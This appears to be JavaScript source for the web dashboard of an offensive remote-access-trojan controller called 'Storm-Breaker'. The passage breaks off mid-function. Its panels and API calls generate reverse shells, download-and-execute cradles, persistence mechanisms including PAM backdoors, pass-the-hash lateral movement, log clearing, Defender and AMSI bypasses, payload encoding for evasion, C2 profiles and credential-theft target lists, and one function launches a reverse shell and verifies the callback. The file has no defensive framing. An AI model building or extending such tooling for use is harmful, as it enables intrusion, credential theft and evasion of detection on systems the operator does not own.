/**
 * Storm-Breaker Advanced RAT Controller UI
 * Frontend for system recon, persistence, shells, lateral movement,
 * credential harvesting, anti-forensics, tunnels, and C2 configuration
 */
const RatControllerUI = {
    initialized: false,

    init() {
        if (!this.initialized) {
            this.bindEvents();
        }
        this.initialized = true;
        this.render();
        this.loadHistory();
    },

    bindEvents() {
        // System Recon
        $(document).on('click', '#btn-rat-recon', () => this.runRecon());
        // Reverse Shells
        $(document).on('click', '#btn-rat-gen-shell', () => this.generateShells());
        $(document).on('click', '#btn-rat-launch', () => this.launchShell());
        $(document).on('click', '#btn-rat-sessions', () => this.loadShellSessions());
        $(document).on('click', '.btn-del-shell', (e) => this.deleteShell($(e.currentTarget).data('id')));
        // Persistence
        $(document).on('click', '#btn-rat-persistence', () => this.generatePersistence());
        // Lateral Movement
        $(document).on('click', '#btn-rat-lateral', () => this.generateLateral());
        // Anti-Forensics
        $(document).on('click', '#btn-rat-antiforensics', () => this.generateAntiForensics());
        // Credential Targets
        $(document).on('click', '#btn-rat-cred-targets', () => this.showCredTargets());
        // Download Cradles
        $(document).on('click', '#btn-rat-cradles', () => this.generateCradles());
        // Process Injection
        $(document).on('click', '#btn-rat-injection', () => this.showInjection());
        // C2 Config
        $(document).on('click', '#btn-rat-c2-config', () => this.buildC2Config());
        // Payload Encoder
        $(document).on('click', '#btn-rat-encode', () => this.encodePayload());
        // Network Tunnels
        $(document).on('click', '#btn-rat-tunnels', () => this.buildTunnels());
        // Copy commands
        $(document).on('click', '.rat-copy-btn', function() {
            const text = $(this).data('cmd') || $(this).closest('.rat-cmd-block').find('code').text();
            navigator.clipboard.writeText(text).then(() => {
                const original = $(this).html();
                $(this).html('<i class="fas fa-check text-green-400"></i>');
                setTimeout(() => $(this).html(original), 1500);
            });
        });
        // Delete record
        $(document).on('click', '.btn-delete-rat', function() {
            RatControllerUI.deleteRecord($(this).data('id'));
        });
        // Sub-tab switching inside RAT panel
        $(document).on('click', '.rat-sub-tab', function() {
            const target = $(this).data('target');
            $('.rat-sub-tab').removeClass('bg-red-600 text-white').addClass('bg-slate-700 text-slate-300');
            $(this).removeClass('bg-slate-700 text-slate-300').addClass('bg-red-600 text-white');
            $('.rat-sub-panel').addClass('hidden');
            $(`#${target}`).removeClass('hidden');
        });
    },

    render() {
        const container = $('#rat-dashboard');
        if (!container.length) return;
        container.html(`
            <div class="space-y-4">
                <!-- Sub-Tab Navigation -->
                <div class="flex flex-wrap gap-1.5 p-1.5 bg-slate-900/50 rounded-xl border border-slate-700/50">
                    <button class="rat-sub-tab px-3 py-1.5 rounded-lg text-xs font-bold transition-all bg-red-600 text-white" data-target="rat-panel-offensive">
                        <i class="fas fa-crosshairs mr-1"></i>Offensive Tools
                    </button>
                    <button class="rat-sub-tab px-3 py-1.5 rounded-lg text-xs font-bold transition-all bg-slate-700 text-slate-300" data-target="rat-panel-recon">
                        <i class="fas fa-search mr-1"></i>Recon & Intel
                    </button>
                    <button class="rat-sub-tab px-3 py-1.5 rounded-lg text-xs font-bold transition-all bg-slate-700 text-slate-300" data-target="rat-panel-shells">
                        <i class="fas fa-terminal mr-1"></i>Shell Generator
                    </button>
                    <button class="rat-sub-tab px-3 py-1.5 rounded-lg text-xs font-bold transition-all bg-slate-700 text-slate-300" data-target="rat-panel-persist">
                        <i class="fas fa-anchor mr-1"></i>Persistence
                    </button>
                    <button class="rat-sub-tab px-3 py-1.5 rounded-lg text-xs font-bold transition-all bg-slate-700 text-slate-300" data-target="rat-panel-lateral">
                        <i class="fas fa-arrows-alt mr-1"></i>Lateral Movement
                    </button>
                    <button class="rat-sub-tab px-3 py-1.5 rounded-lg text-xs font-bold transition-all bg-slate-700 text-slate-300" data-target="rat-panel-evasion">
                        <i class="fas fa-eye-slash mr-1"></i>Anti-Forensics
                    </button>
                    <button class="rat-sub-tab px-3 py-1.5 rounded-lg text-xs font-bold transition-all bg-slate-700 text-slate-300" data-target="rat-panel-history">
                        <i class="fas fa-history mr-1"></i>History
                    </button>
                </div>

                <!-- =================== OFFENSIVE TOOLS PANEL =================== -->
                <div id="rat-panel-offensive" class="rat-sub-panel space-y-4">
                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                        <!-- Download Cradles -->
                        <div class="bg-slate-800/60 rounded-lg border border-slate-700/50 p-4 hover:border-red-500/50 transition-all">
                            <h4 class="text-sm font-bold text-white mb-2"><i class="fas fa-download text-red-400 mr-2"></i>Download Cradles</h4>
                            <p class="text-xs text-slate-400 mb-3">Generate download-and-execute one-liners for payload staging</p>
                            <input type="text" id="rat-cradle-url" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-white mb-2" placeholder="Payload URL (http://...)">
                            <input type="text" id="rat-cradle-output" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-white mb-2" placeholder="Output path (e.g., C:\\temp\\update.exe)">
                            <button id="btn-rat-cradles" class="w-full px-3 py-2 bg-red-600 hover:bg-red-500 text-white rounded-lg text-xs font-bold transition-colors">
                                <i class="fas fa-cloud-download-alt mr-1"></i>Generate Cradles
                            </button>
                        </div>

                        <!-- Process Injection -->
                        <div class="bg-slate-800/60 rounded-lg border border-slate-700/50 p-4 hover:border-purple-500/50 transition-all">
                            <h4 class="text-sm font-bold text-white mb-2"><i class="fas fa-syringe text-purple-400 mr-2"></i>Process Injection</h4>
                            <p class="text-xs text-slate-400 mb-3">Reference guide for injection techniques with MITRE ATT&CK mapping</p>
                            <button id="btn-rat-injection" class="w-full px-3 py-2 bg-purple-600 hover:bg-purple-500 text-white rounded-lg text-xs font-bold transition-colors">
                                <i class="fas fa-book mr-1"></i>View Techniques
                            </button>
                        </div>

                        <!-- C2 Configuration -->
                        <div class="bg-slate-800/60 rounded-lg border border-slate-700/50 p-4 hover:border-orange-500/50 transition-all">
                            <h4 class="text-sm font-bold text-white mb-2"><i class="fas fa-satellite-dish text-orange-400 mr-2"></i>C2 Config Builder</h4>
                            <p class="text-xs text-slate-400 mb-3">Build encrypted C2 communication profiles</p>
                            <input type="text" id="rat-c2-domain" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-white mb-2" placeholder="C2 Domain">
                            <div class="grid grid-cols-2 gap-2 mb-2">
                                <select id="rat-c2-protocol" class="bg-slate-900 border border-slate-700 rounded-lg px-2 py-2 text-xs text-white">
                                    <option value="https">HTTPS</option>
                                    <option value="http">HTTP</option>
                                    <option value="dns">DNS</option>
                                </select>
                                <input type="number" id="rat-c2-port" class="bg-slate-900 border border-slate-700 rounded-lg px-2 py-2 text-xs text-white" value="443" placeholder="Port">
                            </div>
                            <div class="grid grid-cols-2 gap-2 mb-2">
                                <input type="number" id="rat-c2-sleep" class="bg-slate-900 border border-slate-700 rounded-lg px-2 py-2 text-xs text-white" value="60" placeholder="Sleep (s)">
                                <input type="number" id="rat-c2-jitter" class="bg-slate-900 border border-slate-700 rounded-lg px-2 py-2 text-xs text-white" value="20" placeholder="Jitter %">
                            </div>
                            <button id="btn-rat-c2-config" class="w-full px-3 py-2 bg-orange-600 hover:bg-orange-500 text-white rounded-lg text-xs font-bold transition-colors">
                                <i class="fas fa-cog mr-1"></i>Build Config
                            </button>
                        </div>

                        <!-- Payload Encoder -->
                        <div class="bg-slate-800/60 rounded-lg border border-slate-700/50 p-4 hover:border-cyan-500/50 transition-all">
                            <h4 class="text-sm font-bold text-white mb-2"><i class="fas fa-code text-cyan-400 mr-2"></i>Payload Encoder</h4>
                            <p class="text-xs text-slate-400 mb-3">Encode payloads with multiple evasion techniques</p>
                            <textarea id="rat-encode-payload" rows="2" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-white font-mono mb-2" placeholder="Enter payload command..."></textarea>
                            <select id="rat-encode-technique" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-2 py-2 text-xs text-white mb-2">
                                <option value="all">All Encodings</option>
                                <option value="base64">Base64</option>
                                <option value="hex">Hex</option>
                                <option value="xor">XOR</option>
                                <option value="rot13">ROT13</option>
                                <option value="reverse">String Reversal</option>
                                <option value="decimal">Decimal/Char Codes</option>
                            </select>
                            <button id="btn-rat-encode" class="w-full px-3 py-2 bg-cyan-600 hover:bg-cyan-500 text-white rounded-lg text-xs font-bold transition-colors">
                                <i class="fas fa-lock mr-1"></i>Encode Payload
                            </button>
                        </div>

                        <!-- Network Tunnels -->
                        <div class="bg-slate-800/60 rounded-lg border border-slate-700/50 p-4 hover:border-teal-500/50 transition-all">
                            <h4 class="text-sm font-bold text-white mb-2"><i class="fas fa-dungeon text-teal-400 mr-2"></i>Network Tunnels</h4>
                            <p class="text-xs text-slate-400 mb-3">SSH, Chisel, DNS, ICMP tunneling & port forwarding</p>
                            <input type="text" id="rat-tunnel-remote" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-white mb-2" placeholder="Remote host">
                            <div class="grid grid-cols-2 gap-2 mb-2">
                                <input type="number" id="rat-tunnel-lport" class="bg-slate-900 border border-slate-700 rounded-lg px-2 py-2 text-xs text-white" value="8080" placeholder="Local port">
                                <input type="number" id="rat-tunnel-rport" class="bg-slate-900 border border-slate-700 rounded-lg px-2 py-2 text-xs text-white" value="80" placeholder="Remote port">
                            </div>
                            <button id="btn-rat-tunnels" class="w-full px-3 py-2 bg-teal-600 hover:bg-teal-500 text-white rounded-lg text-xs font-bold transition-colors">
                                <i class="fas fa-route mr-1"></i>Generate Tunnels
                            </button>
                        </div>

                        <!-- Credential Targets -->
                        <div class="bg-slate-800/60 rounded-lg border border-slate-700/50 p-4 hover:border-amber-500/50 transition-all">
                            <h4 class="text-sm font-bold text-white mb-2"><i class="fas fa-key text-amber-400 mr-2"></i>Credential Targets</h4>
                            <p class="text-xs text-slate-400 mb-3">Browser creds, WiFi keys, SSH keys, cloud tokens, system secrets</p>
                            <button id="btn-rat-cred-targets" class="w-full px-3 py-2 bg-amber-600 hover:bg-amber-500 text-white rounded-lg text-xs font-bold transition-colors">
                                <i class="fas fa-map mr-1"></i>View All Targets
                            </button>
                        </div>
                    </div>
                </div>

                <!-- =================== RECON PANEL =================== -->
                <div id="rat-panel-recon" class="rat-sub-panel hidden space-y-4">
                    <div class="bg-slate-800/60 rounded-lg border border-emerald-700/50 p-5">
                        <h4 class="text-sm font-bold text-white mb-2"><i class="fas fa-radar text-emerald-400 mr-2"></i>Deep System Reconnaissance</h4>
                        <p class="text-xs text-slate-400 mb-4">Comprehensive host profiling: OS, hardware, network interfaces, processes, security posture, environment variables, drives, and user accounts</p>
                        <button id="btn-rat-recon" class="px-6 py-3 bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-500 hover:to-green-500 text-white rounded-lg text-sm font-bold transition-all shadow-lg shadow-emerald-500/20">
                            <i class="fas fa-search-plus mr-2"></i>Run Full Recon
                        </button>
                    </div>
                    <div id="rat-recon-result" class="hidden"></div>
                </div>

                <!-- =================== SHELL GENERATOR PANEL =================== -->
                <div id="rat-panel-shells" class="rat-sub-panel hidden space-y-4">
                    <div class="bg-slate-800/60 rounded-lg border border-rose-700/50 p-5">
                        <h4 class="text-sm font-bold text-white mb-3"><i class="fas fa-terminal text-rose-400 mr-2"></i>Reverse Shell Generator</h4>
                        <p class="text-xs text-slate-400 mb-4">Generate reverse shells in 12+ languages: Bash, Python, PowerShell, PHP, Ruby, Perl, Netcat, Java, Node.js, Go, and msfvenom payloads</p>
                        <div class="grid grid-cols-1 md:grid-cols-3 gap-3 mb-4">
                            <div>
                                <label class="text-xs text-slate-400 mb-1 block">LHOST (Your IP)</label>
                                <input type="text" id="rat-shell-lhost" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white font-mono" placeholder="10.10.14.1">
                            </div>
                            <div>
                                <label class="text-xs text-slate-400 mb-1 block">LPORT</label>
                                <input type="text" id="rat-shell-lport" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white font-mono" value="4444" placeholder="4444">
                            </div>
                            <div>
                                <label class="text-xs text-slate-400 mb-1 block">Encoding</label>
                                <select id="rat-shell-encoding" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white">
                                    <option value="none">None (Plain)</option>
                                    <option value="base64">Base64</option>
                                    <option value="url">URL Encode</option>
                                    <option value="hex">Hex</option>
                                    <option value="powershell_b64">PowerShell -enc</option>
                                </select>
                            </div>
                        </div>
                        <div class="flex gap-2">
                            <button id="btn-rat-gen-shell" class="flex-1 px-4 py-3 bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-500 hover:to-red-500 text-white rounded-lg text-sm font-bold transition-all shadow-lg shadow-rose-500/20">
                                <i class="fas fa-bolt mr-2"></i>Generate All Shells
                            </button>
                            <button id="btn-rat-launch" class="px-4 py-3 bg-gradient-to-r from-amber-600 to-orange-600 hover:from-amber-500 hover:to-orange-500 text-white rounded-lg text-sm font-bold transition-all" title="Run python_reverse locally against a listener and VERIFY the callback">
                                <i class="fas fa-play mr-2"></i>Launch &amp; Verify
                            </button>
                            <button id="btn-rat-sessions" class="px-4 py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm font-bold transition-all" title="List saved shell sessions">
                                <i class="fas fa-list mr-2"></i>Saved
                            </button>
                        </div>
                    </div>
                    <div id="rat-shells-list" class="hidden"></div>
                    <div id="rat-shells-result" class="hidden"></div>
                </div>

                <!-- =================== PERSISTENCE PANEL =================== -->
                <div id="rat-panel-persist" class="rat-sub-panel hidden space-y-4">
                    <div class="bg-slate-800/60 rounded-lg border border-violet-700/50 p-5">
                        <h4 class="text-sm font-bold text-white mb-3"><i class="fas fa-anchor text-violet-400 mr-2"></i>Persistence Generator</h4>
                        <p class="text-xs text-slate-400 mb-4">Generate persistence mechanisms: Registry, Scheduled Tasks, WMI Events, Services, DLL Hijacking, Crontab, Systemd, SSH Keys, LD_PRELOAD, PAM Backdoors</p>
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
                            <div>
                                <label class="text-xs text-slate-400 mb-1 block">Target OS</label>
                                <select id="rat-persist-os" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white">
                                    <option value="windows">Windows</option>
                                    <option value="linux">Linux</option>
                                </select>
                            </div>
                            <div>
                                <label class="text-xs text-slate-400 mb-1 block">Method</label>
                                <select id="rat-persist-method" class="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white">
                                    <option value="all">All Methods</option>
                                    <option value="registry">Registry Run Key</option>
                                    <option value="scheduled_task">Scheduled Task</option>
                                    <option value="startup_folder">Startup Folder</option>
                                    <option value="wmi_event">WMI Event</option>
                                    <option value="service">Windows Service</option>
                                    <option value="dll_hijack">DLL Hijacking</option>
                                    <option value="crontab">Crontab</option>
                                    <option value="bashrc">.bashrc/.profile</option>
                                    <option value="systemd">Systemd Service</option>
                                    <option value="ssh_key">SSH Authorized Keys</option>
                                    <option value="ld_preload">LD_PRELOAD</option>
                                    <option value="pam_backdoor">PAM Backdoor</option>
                                </select>
                            </div>
                        </div>
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
                            <input type="text" id="rat-persist-payload" class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-white" placeholder="Custom payload command (optional)">
                            <input type="text" id="rat-persist-callback" class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-white" placeholder="Callback URL (optional)">
                        </div>
                        <button id="btn-rat-persistence" class="px-6 py-3 bg-gradient-to-r from-violet-600 to-purple-600 hover:from-violet-500 hover:to-purple-500 text-white rounded-lg text-sm font-bold transition-all shadow-lg shadow-violet-500/20">
                            <i class="fas fa-hammer mr-2"></i>Generate Persistence
                        </button>
                    </div>
                    <div id="rat-persist-result" class="hidden"></div>
                </div>

                <!-- =================== LATERAL MOVEMENT PANEL =================== -->
                <div id="rat-panel-lateral" class="rat-sub-panel hidden space-y-4">
                    <div class="bg-slate-800/60 rounded-lg border border-sky-700/50 p-5">
                        <h4 class="text-sm font-bold text-white mb-3"><i class="fas fa-arrows-alt text-sky-400 mr-2"></i>Lateral Movement</h4>
                        <p class="text-xs text-slate-400 mb-4">PsExec, WMI, WinRM, RDP Hijacking, SSH, DCOM, Pass-the-Hash — with Impacket, Metasploit & native tool commands</p>
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
                            <input type="text" id="rat-lat-target" class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white" placeholder="Target Host (IP/hostname)">
                            <input type="text" id="rat-lat-domain" class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white" placeholder="Domain (optional)">
                            <input type="text" id="rat-lat-user" class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white" placeholder="Username">
                            <input type="text" id="rat-lat-pass" class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white" placeholder="Password / NTLM Hash">
                        </div>
                        <button id="btn-rat-lateral" class="px-6 py-3 bg-gradient-to-r from-sky-600 to-blue-600 hover:from-sky-500 hover:to-blue-500 text-white rounded-lg text-sm font-bold transition-all shadow-lg shadow-sky-500/20">
                            <i class="fas fa-network-wired mr-2"></i>Generate Lateral Commands
                        </button>
                    </div>
                    <div id="rat-lateral-result" class="hidden"></div>
                </div>

                <!-- =================== ANTI-FORENSICS PANEL =================== -->
                <div id="rat-panel-evasion" class="rat-sub-panel hidden space-y-4">
                    <div class="bg-slate-800/60 rounded-lg border border-rose-700/50 p-5">
                        <h4 class="text-sm font-bold text-white mb-3"><i class="fas fa-eye-slash text-rose-400 mr-2"></i>Anti-Forensics Toolkit</h4>
                        <p class="text-xs text-slate-400 mb-4">Log clearing, timestomping, secure delete, Defender bypass, AMSI bypass, rootkit hiding techniques</p>
                        <div class="grid grid-cols-2 gap-3 mb-4">
                            <select id="rat-af-os" class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white">
                                <option value="windows">Windows</option>
                                <option value="linux">Linux</option>
                            </select>
                            <select id="rat-af-action" class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white">
                                <option value="all">All Techniques</option>
                                <option value="log_clearing">Log Clearing</option>
                                <option value="timestomp">Timestomping</option>
                                <option value="secure_delete">Secure Delete</option>
                                <option value="disable_defender">Disable Defender</option>
                                <option value="amsi_bypass">AMSI Bypass</option>
                                <option value="rootkit_hiding">Rootkit Hiding</option>
                            </select>
                        </div>
                        <button id="btn-rat-antiforensics" class="px-6 py-3 bg-gradient-to-r from-rose-600 to-pink-600 hover:from-rose-500 hover:to-pink-500 text-white rounded-lg text-sm font-bold transition-all shadow-lg shadow-rose-500/20">
                            <i class="fas fa-eraser mr-2"></i>Generate Anti-Forensics
                        </button>
                    </div>
                    <div id="rat-af-result" class="hidden"></div>
                </div>

                <!-- =================== HISTORY PANEL =================== -->
                <div id="rat-panel-history" class="rat-sub-panel hidden space-y-4">
                    <h3 class="text-sm font-bold text-white"><i class="fas fa-history text-red-400 mr-2"></i>RAT Operations History</h3>
                    <div id="rat-history-list" class="space-y-2 max-h-[500px] overflow-y-auto"></div>
                </div>

                <!-- =================== RESULT DISPLAY =================== -->
                <div id="rat-result" class="hidden bg-slate-900 rounded-xl border border-red-800/50 p-5">
                    <div class="flex items-center justify-between mb-3">
                        <h3 id="rat-result-title" class="text-sm font-bold text-white"><i class="fas fa-skull-crossbones text-red-400 mr-2"></i>Result</h3>
                        <div class="flex items-center gap-2">
                            <button onclick="navigator.clipboard.writeText($('#rat-result-raw').text()).then(()=>$(this).html('<i class=\\'fas fa-check\\'></i>'))" class="text-slate-500 hover:text-green-400 text-xs px-2 py-1 rounded bg-slate-800"><i class="fas fa-copy"></i> Copy All</button>
                            <button onclick="$('#rat-result').addClass('hidden')" class="text-slate-500 hover:text-white text-xs"><i class="fas fa-times"></i></button>
                        </div>
                    </div>
                    <div id="rat-result-visual" class="mb-3"></div>
                    <pre id="rat-result-raw" class="text-xs text-slate-300 bg-slate-950 rounded-lg p-4 overflow-auto max-h-[400px] font-mono"></pre>
                </div>
            </div>
        `);
    },

    // =============== API CALLS ===============

    async runRecon() {
        const btn = $('#btn-rat-recon');
        btn.prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-2"></i>Scanning...');
        try {
            const res = await $.ajax({ url: '/api/rat/recon', method: 'POST', contentType: 'application/json', data: '{}' });
            this.showReconResult(res);
            this.loadHistory();
        } catch(e) { Swal.fire('Error', 'Recon failed', 'error'); }
        finally { btn.prop('disabled', false).html('<i class="fas fa-search-plus mr-2"></i>Run Full Recon'); }
    },

    async generateShells() {
        const lhost = $('#rat-shell-lhost').val().trim();
        const lport = $('#rat-shell-lport').val().trim() || '4444';
        const encoding = $('#rat-shell-encoding').val();
        if (!lhost) { Swal.fire('Missing', 'Enter your LHOST IP', 'warning'); return; }
        try {
            const res = await $.ajax({ url: '/api/rat/shells', method: 'POST', contentType: 'application/json',
                data: JSON.stringify({ shell_type: 'all', lhost, lport, encoding })
            });
            this.showShellsResult(res);
            this.loadHistory();
        } catch(e) { Swal.fire('Error', 'Shell generation failed', 'error'); }
    },

    // P16: the first RAT action that actually EXECUTES something.
    async launchShell() {
        const lhost = ($('#rat-shell-lhost').val() || '').trim() || '127.0.0.1';
        try {
            const res = await $.ajax({ url: '/api/rat/launch', method: 'POST', contentType: 'application/json',
                data: JSON.stringify({ payload_type: 'python_reverse', lhost, lport: 0, timeout: 4 }) });
            const cls = res.ok ? 'text-emerald-400' : 'text-amber-400';
            const ex = res.exec || {};
            $('#rat-shells-list').removeClass('hidden').html(
                `<div class="bg-slate-800/60 rounded-lg border border-slate-700/50 p-4">
                    <div class="text-xs font-mono ${cls}">${this.escapeHtml(res.summary || res.error || '')}</div>
                    <div class="text-xs text-slate-500 mt-1">exit=${ex.exit_code} timed_out=${ex.timed_out} target=${this.escapeHtml(res.target || '')}</div>
                </div>`);
            GrowlNotification.notify({ title: res.ok ? 'Callback VERIFIED' : 'No callback',
                description: res.summary || res.error || '', type: res.ok ? 'success' : 'warning',
                position: 'top-right', closeTimeout: 4000 });
            this.loadHistory();
        } catch(e) { Swal.fire('Error', 'Launch failed (needs python3 on this host)', 'error'); }
    },

    async loadShellSessions() {
        try {
            const res = await $.getJSON('/api/rat/shells');
            const rows = (res.sessions || []).map(s =>
                `<div class="flex items-center justify-between bg-slate-800/40 rounded-lg px-3 py-2 border border-slate-700/30">
                    <span class="text-xs text-white">${this.escapeHtml(s.shell_type)}
                        <span class="text-slate-500">${this.escapeHtml(s.lhost)}:${this.escapeHtml(String(s.lport))}</span></span>
                    <button class="btn-del-shell text-slate-500 hover:text-red-400 text-xs" data-id="${s.id}"><i class="fas fa-trash"></i></button>
                </div>`).join('');
            $('#rat-shells-list').removeClass('hidden').html(rows || '<p class="text-xs text-slate-500 text-center py-3">No saved sessions</p>');
        } catch(e) { console.error('shell sessions load error:', e); }
    },

    async deleteShell(id) {
        try { await $.ajax({ url: `/api/rat/shells/${id}`, method: 'DELETE' }); this.loadShellSessions(); }
        catch(e) { console.error(e); }
    },

    async generatePersistence() {
        const os_type = $('#rat-persist-os').val();
        const method = $('#rat-persist-method').val();
        const payload_cmd = $('#rat-persist-payload').val().trim();
        const callback_url = $('#rat-persist-callback').val().trim();
        try {
            const res = await $.ajax({ url: '/api/rat/persistence', method: 'POST', contentType: 'application/json',
                data: JSON.stringify({ os_type, method, payload_cmd, callback_url })
            });
            this.showPersistenceResult(res);
            this.loadHistory();
        } catch(e) { Swal.fire('Error', 'Generation failed', 'error'); }
    },

    async generateLateral() {
        const target_host = $('#rat-lat-target').val().trim();
        const username = $('#rat-lat-user').val().trim();
        const password = $('#rat-lat-pass').val().trim();
        const domain = $('#rat-lat-domain').val().trim();
        if (!target_host) { Swal.fire('Missing', 'Enter target host', 'warning'); return; }
        try {
            const res = await $.ajax({ url: '/api/rat/lateral', method: 'POST', contentType: 'application/json',
                data: JSON.stringify({ technique: 'all', target_host, username, password, domain })
            });
            this.showLateralResult(res);
            this.loadHistory();
        } catch(e) { Swal.fire('Error', 'Generation failed', 'error'); }
    },

    async generateAntiForensics() {
        const target_os = $('#rat-af-os').val();
        const action = $('#rat-af-action').val();
        try {
            const res = await $.ajax({ url: '/api/rat/anti-forensics', method: 'POST', contentType: 'application/json',
                data: JSON.stringify({ target_os, action })
            });
            this.showAntiForensicsResult(res);
            this.loadHistory();
        } catch(e) { Swal.fire('Error', 'Generation failed', 'error'); }
    },

    async showCredTargets() {
        try {
            const res = await $.getJSON('/api/rat/credentials/targets');
            this.showCredTargetsResult(res);
        } catch(e) { Swal.fire('Error', 'Failed to load', 'error'); }
    },

    async generateCradles() {
        const payload_url = $('#rat-cradle-url').val().trim();
        const output_path = $('#rat-cradle-output').val().trim() || 'payload.exe';
        if (!payload_url) { Swal.fire('Missing', 'Enter payload URL', 'warning'); return; }
        try {
            const res = await $.ajax({ url: '/api/rat/cradles', method: 'POST', contentType: 'application/json',
                data: JSON.stringify({ payload_url, output_path })
            });
            this.showCradlesResult(res);
            this.loadHistory();
        } catch(e) { Swal.fire('Error', 'Generation failed', 'error'); }
    },

    async showInjection() {
        try {
            const res = await $.getJSON('/api/rat/injection');
            this.showInjectionResult(res);
        } catch(e) { Swal.fire('Error', 'Failed to load', 'error'); }
    },

    async buildC2Config() {
        const domain = $('#rat-c2-domain').val().trim();
        const protocol = $('#rat-c2-protocol').val();
        const port = parseInt($('#rat-c2-port').val()) || 443;
        const sleep = parseInt($('#rat-c2-sleep').val()) || 60;
        const jitter = parseInt($('#rat-c2-jitter').val()) || 20;
        try {
            const res = await $.ajax({ url: '/api/rat/c2-config', method: 'POST', contentType: 'application/json',
                data: JSON.stringify({ domain, protocol, port, sleep, jitter })
            });
            this.showResult('C2 Configuration', res);
            this.loadHistory();
        } catch(e) { Swal.fire('Error', 'Config build failed', 'error'); }
    },

    async encodePayload() {
        const payload = $('#rat-encode-payload').val().trim();
        const technique = $('#rat-encode-technique').val();
        if (!payload) { Swal.fire('Missing', 'Enter a payload to encode', 'warning'); return; }
        try {
            const res = await $.ajax({ url: '/api/rat/encode', method: 'POST', contentType: 'application/json',
                data: JSON.stringify({ payload, technique })
            });
            this.showEncoderResult(res);
        } catch(e) { Swal.fire('Error', 'Encoding failed', 'error'); }
    },

    async buildTunnels() {
        const remote_host = $('#rat-tunnel-remote').val().trim();
        const local_port = parseInt($('#rat-tunnel-lport').val()) || 8080;
        const remote_port = parseInt($('#rat-tunnel-rport').val()) || 80;
        try {
            const res = await $.ajax({ url: '/api/rat/tunnels', method: 'POST', contentType: 'application/json',
                data: JSON.stringify({ tunnel_type: 'all', local_port, remote_host, remote_port })
            });
            this.showTunnelsResult(res);
            this.loadHistory();
        } catch(e) { Swal.fire('Error', 'Generation failed', 'error'); }
    },

    // =============== RESULT RENDERERS ===============

    showResult(title, data) {
        $('#rat-result-title').html(`<i class="fas fa-skull-crossbones text-red-400 mr-2"></i>${title}`);
        $('#rat-result-visual').empty();
        $('#rat-result-raw').text(JSON.stringify(data, null, 2));
        $('#rat-result').removeClass('hidden');
        $('html, body').animate({ scrollTop: $('#rat-result').offset().top - 100 }, 300);
    },

    showReconResult(data) {
        let html = '<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 mb-4">';

        // OS Info
        html += `<div class="bg-slate-800/80 rounded-lg p-3 border border-emerald-700/30">
            <h5 class="text-xs font-bold text-emerald-400 mb-2"><i class="fas fa-desktop mr-1"></i>Operating System</h5>
            <div class="space-y-1 text-xs text-slate-300">
                <div><span class="text-slate-500">System:</span> ${data.os?.system} ${data.os?.release}</div>
                <div><span class="text-slate-500">Machine:</span> ${data.os?.machine} (${data.os?.architecture})</div>
                <div><span class="text-slate-500">Hostname:</span> ${data.os?.hostname}</div>
                <div><span class="text-slate-500">Processor:</span> ${data.os?.processor || 'N/A'}</div>
            </div>
        </div>`;

        // Security
        const sec = data.security || {};
        const avCount = (sec.antivirus_indicators || []).length;
        const vmCount = (sec.vm_indicators || []).length;
        html += `<div class="bg-slate-800/80 rounded-lg p-3 border border-${avCount ? 'red' : 'green'}-700/30">
            <h5 class="text-xs font-bold text-${avCount ? 'red' : 'green'}-400 mb-2"><i class="fas fa-shield-alt mr-1"></i>Security Posture</h5>
            <div class="space-y-1 text-xs text-slate-300">
                <div><span class="text-slate-500">AV Detected:</span> <span class="text-${avCount ? 'red' : 'green'}-400">${avCount ? sec.antivirus_indicators.join(', ') : 'None'}</span></div>
                <div><span class="text-slate-500">Sandbox:</span> ${(sec.sandbox_indicators || []).length ? sec.sandbox_indicators.join(', ') : 'None detected'}</div>
                <div><span class="text-slate-500">VM Indicators:</span> ${vmCount ? sec.vm_indicators.join(', ') : 'None'}</div>
            </div>
        </div>`;

        // Network
        const net = data.network || {};
        const ips = (net.local_ips || []).join(', ');
        html += `<div class="bg-slate-800/80 rounded-lg p-3 border border-blue-700/30">
            <h5 class="text-xs font-bold text-blue-400 mb-2"><i class="fas fa-network-wired mr-1"></i>Network</h5>
            <div class="space-y-1 text-xs text-slate-300">
                <div><span class="text-slate-500">Local IPs:</span> ${ips || 'N/A'}</div>
                <div><span class="text-slate-500">Interfaces:</span> ${Object.keys(net.interfaces || {}).length}</div>
                <div><span class="text-slate-500">Active Conns:</span> ${(net.connections || []).length}</div>
            </div>
        </div>`;

        // Drives
        html += `<div class="bg-slate-800/80 rounded-lg p-3 border border-amber-700/30">
            <h5 class="text-xs font-bold text-amber-400 mb-2"><i class="fas fa-hdd mr-1"></i>Drives</h5>
            <div class="space-y-1 text-xs text-slate-300">`;
        for (const d of (data.drives || [])) {
